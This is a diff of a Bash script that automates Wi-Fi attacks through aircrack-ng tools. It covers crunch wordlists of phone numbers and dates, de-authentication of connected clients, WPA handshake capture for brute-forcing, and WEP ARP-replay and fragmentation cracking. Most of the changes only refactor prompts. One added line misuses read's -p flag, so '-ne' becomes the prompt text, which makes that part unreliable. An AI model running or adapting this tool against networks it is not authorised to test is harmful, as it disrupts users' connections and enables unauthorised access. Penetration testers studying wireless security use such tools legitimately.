@@ -108,7 +108,6 @@ fi
 function phones_wl {
 clear
 echo -ne "------- Phone number generator, using crunch. -------\n\n[c] to Cancel at any time\n\n"
-
 while read -rn2 -p "Phone Number length : " LENGTH
 do
     case "$LENGTH" in
@@ -169,14 +168,13 @@ do
             generate_wordlists
             ;;
         * )
-            echo -ne "\nInvalid number $RECURRING : \n" 
-        esac    
-done 
-
+            echo -ne "\nInvalid number $RECURRING : \n"
+        esac
+done
 TMP_1=${#PREFIX}
 TMP_2=$(("$LENGTH" - "$TMP_1" + 1))
 TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
-TMP_4=$(echo "$TMP_3" | sed 's/%/X/g')
+TMP_4=$(sed 's/%/X/g' <<< "$TMP_3")
 if [[ -z "$RECURRING" ]]; then
     crunch "$LENGTH" "$LENGTH" -t "$PREFIX""$TMP_3" -o "$PREFIX""$TMP_4".lst
 else
@@ -242,10 +240,9 @@ generate_wordlists
 }
 function generate_wordlists {
 clear
-SELECT="Select : "
 echo "---------------- Generate Wordlists ----------------"
-echo -ne "\nd) Generate Dates\np) Generate Phone numbers\n\nc) Cancel\n\n$SELECT"
-while read -rn1 WORD
+echo -ne "\nd) Generate Dates\np) Generate Phone numbers\n\nc) Cancel\n\n"
+while read -rn1 -p "Select : " WORD
 do
     case "$WORD" in
         d )
@@ -267,7 +264,7 @@ do
             break
             ;;
         * )
-            echo -ne "\n$SELECT"
+            echo
             ;;
     esac
 done
@@ -289,9 +286,8 @@ unset FLG
 }
 function filter_APs {
 clear
-SELECT="Select : "
-echo -ne "Select Cracking Mode\n\n1) WEP\n2) WPA 1/2\n\nc) Cancel\n\n$SELECT"
-while read -rn1 MODE
+echo -ne "Select Cracking Mode\n\n1) WEP\n2) WPA 1/2\n\nc) Cancel\n\n"
+while read -rn1 -p "Select : " MODE
 do
     case "$MODE" in
         1 )
@@ -313,7 +309,7 @@ do
             break
             ;;
         * )
-            echo -ne "\n$SELECT"
+            echo
             ;;
     esac
 done
@@ -343,10 +339,10 @@ else
         break
     done
     AP="$CHOICE"
-    BSSID=$(echo "$AP" | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
-    CHAN=$(echo "$AP" | awk -F ':' '{print $2}')
-    ESSID=$(echo "$AP" | awk -F ':' '{print $1}')
-    SIG=$(echo "$AP" | awk -F ':' '{print $NF}')
+    BSSID=$(awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' <<< "$AP" | sed 's/\\/\:/g' | xargs | sed 's/ //g')
+    CHAN=$(awk -F ':' '{print $2}' <<< "$AP")
+    ESSID=$(awk -F ':' '{print $1}' <<< "$AP")
+    SIG=$(awk -F ':' '{print $NF}' <<< "$AP")
     CHANFLAG=1
     REPLY="$CHAN"
 fi
@@ -356,7 +352,7 @@ echo
 read -rp "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
 grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' <<< $CLIENT
 if [[ "$?" != 0 ]]; then
-    echo -ne "\nInvalid MAC! Try again."
+    echo -ne "\nInvalid MAC address!"
     de-auth
 fi
 while read -rn2 -p "How many times ? [1-99] : " TIMES
@@ -375,7 +371,7 @@ do
             break
             ;;
         * )
-            echo -ne "\nInvalid value\n"
+            echo
             ;;
     esac
 done
@@ -384,31 +380,29 @@ aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
 function wpa_attacks {
 clear
 echo "------------ WPA1/2 4-Way Handshake Capture ------------"
-read -rp "Press Enter to continue ? "
+read -rp "Press Enter to continue"
 ESSID=$(tr -d ' ' <<< "$ESSID")
 AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
 env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
-CNT="Are any clients connected ? [yn] "
 echo -ne "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
-You capture a 4-Way Handshake by forcing an already connected client to disconnect, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake.\n\nWhen a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output.\n$CNT"
-while read -rn1 YESNO
+You capture a 4-Way Handshake by forcing an already connected client to disconnect, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake.\n\nWhen a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output.\n"
+while read -rn1 -p "Are any clients connected ? [yn] " YESNO
 do
     case "$YESNO" in
         [Yy] )
             de-auth
-            CONNECT="[c] Cancel [y] Try again [n] Change settings : "
-            echo -n "$CONNECT"
-            while read -rn1 CON
+            echo
+            while read -rn1 -p "[c] Cancel [y] Try again [n] Change settings : " CON
             do
                 case "$CON" in
                     [Yy] )
                         echo
                         aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
-                        echo -n "$CONNECT"
+                        echo
                         ;;
                     [Nn] )
                         de-auth
-                        echo -n "$CONNECT"
+                        echo
                         ;;
                     [Cc] )
                         kill "$(pgrep xterm)"
@@ -418,7 +412,7 @@ do
                         options
                         ;;
                     * )
-                        echo -ne "\n$CONNECT"
+                        echo
                         ;;
                 esac
             done
@@ -436,19 +430,19 @@ do
             break
             ;;
         * )
-            echo -ne "\n$CNT"
+            echo
             ;;
     esac
 done
 }
 function clean_up {
-echo -ne "\nClean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] "
-while read -rn1 ASR 
+echo
+while read -rn1 -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR 
 do 
     case "$ASR" in
         [Yy] )
-            echo -ne "\nKeep $ESSID.cap file ? [yn] "
-            while read -rn1 ANS
+            echo
+            while read -rn1 -p -ne "Keep $ESSID.cap file ? [yn] " ANS
             do
                 case "$ANS" in
                     [Yy] )
@@ -473,7 +467,7 @@ do
                         break
                         ;;
                     * )
-                        echo -ne "\nKeep $ESSID.cap file ? [yn] "
+                        echo
                         ;;
                 esac
             done
@@ -484,7 +478,7 @@ do
             break
             ;;
         * )
-            echo -ne "\nYes or No ? [yn] : "
+            echo
             ;;
     esac
 done
@@ -492,7 +486,7 @@ done
 function fragmentation { 
 clear
 echo "------------ WEP Fragmentation method ------------"
-read -rp "Press Enter to continue ? "
+read -rp "Press Enter to continue"
 if [[ -z "$STATE" ]]; then
     echo -ne "\n\nSetting M/M on $IFACE"
     set_mon >> /dev/null
@@ -580,8 +574,7 @@ clear
 echo "------------ WEP ARP replay method ------------"
 read -rp "Press Enter to continue"
 if [[ -z "$STATE" ]]; then
-    echo
-    echo "Setting M/M on $IFACE"
+    echo -ne "\n\nSetting M/M on $IFACE"
     set_mon >> /dev/null
 fi
 ESSID=$(tr -d ' ' <<< "$ESSID")
@@ -644,10 +637,9 @@ done
 }
 function wep_attacks {
 clear
-PROMPT="Select : "
 echo "-------------- Select Attack Method --------------"
-echo -ne "\nYou picked ($AP)\n\nAP Name       : $ESSID\nAP Channel    : $CHAN\nAP MAC        : $BSSID\nAP Signal     : $SIG/100\n\n1) ARP Replay Attack\n2) Fragmentation Attack\n\ns) Select different AP\nc) Cancel\n\n$PROMPT"
-while read -rn1 SEL
+echo -ne "\nYou picked ($AP)\n\nAP Name       : $ESSID\nAP Channel    : $CHAN\nAP MAC        : $BSSID\nAP Signal     : $SIG/100\n\n1) ARP Replay Attack\n2) Fragmentation Attack\n\ns) Select different AP\nc) Cancel\n\n"
+while read -rn1 -p "Select : " SEL
 do
     case "$SEL" in
         1 )
@@ -669,7 +661,7 @@ do
             break
             ;;
         * )
-            echo -ne "\n$PROMPT"
+            echo
             ;;
     esac
 done
@@ -763,9 +755,7 @@ if [[ -n "$STATE" ]]; then
     sleep 5
 fi
 nmcli -p dev wifi list
-SELECT="Press [r] to rescan or Enter to go back : "
-echo -ne "\n\n$SELECT"
-while read -rn1 SLCT
+while read -rn1 -p "Press [r] to rescan or Enter to go back : " SLCT
 do
     case "$SLCT" in
         [Rr] )
@@ -784,7 +774,7 @@ clear
 if [[ "$IFACENUM" -gt 1 ]]; then
     SWITCH="c) Change Interface"
 fi
-if [[ -n $STATE ]]; then
+if [[ -n "$STATE" ]]; then
     MM=ON
 else
     MM=OFF
@@ -811,8 +801,6 @@ fi
 echo "t) Test Injection"
 echo "q) Abort!"
 echo
-PROMPT="Select : "
-echo -n "$PROMPT"
 }
 function list_ifaces {
 clear
@@ -827,7 +815,7 @@ IFACE=$(awk -F ' ' '{print $2}' <<< "$CHOICE")
 function options {
 STATE=$(iw "$IFACE" info | grep monitor)
 menu
-while read -rn1 CHAR
+while read -rn1 -p "Select : " CHAR
 do
     case "$CHAR" in
         1 )
@@ -884,7 +872,7 @@ do
                 options
                 break
             else
-                echo -ne "\n$PROMPT"
+                echo
             fi
             ;;
         q )
@@ -892,7 +880,7 @@ do
             exit 0
             ;;
         * )
-            echo -ne "\n$PROMPT"
+            echo
             ;;
     esac
 done
